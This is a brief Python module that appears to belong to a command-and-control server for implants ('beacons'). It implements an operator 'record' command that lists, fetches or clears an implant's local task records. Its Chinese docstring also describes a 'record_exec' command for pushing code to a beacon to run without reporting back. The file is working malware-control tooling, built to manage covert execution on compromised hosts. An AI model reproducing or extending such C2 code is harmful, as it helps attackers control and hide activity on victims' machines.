"""record — 查看植入物本地任务记录(record 型任务, 只记录不上报):

record <beacon_id> list              列出全部记录
record <beacon_id> get <task_id>     查看单条记录
record <beacon_id> clear             清空记录

下发"只记录不上报"的任务用: record_exec <beacon_id> <代码...>
"""

from server.task_queue import Task


def run(disp, args):
    if len(args) < 1:
        return "[!] usage: record <beacon_id> list|get <task_id>|clear"
    bid, rest = disp.resolve_beacon(args)
    if not bid:
        return "[!] 未指定 Beacon"
    action = rest[0] if rest else "list"
    task_id = rest[1] if len(rest) > 1 else ""
    if action not in ("list", "get", "clear"):
        return f"[!] usage: record <beacon_id> list|get <task_id>|clear"
    task = disp.build_task("record", [action, task_id])
    if task is None:
        return "[!] unknown module: record"
    r = disp.push_task(bid, task)
    return f"[+] 已下发记录查询({action}) → {bid}\n{r}"
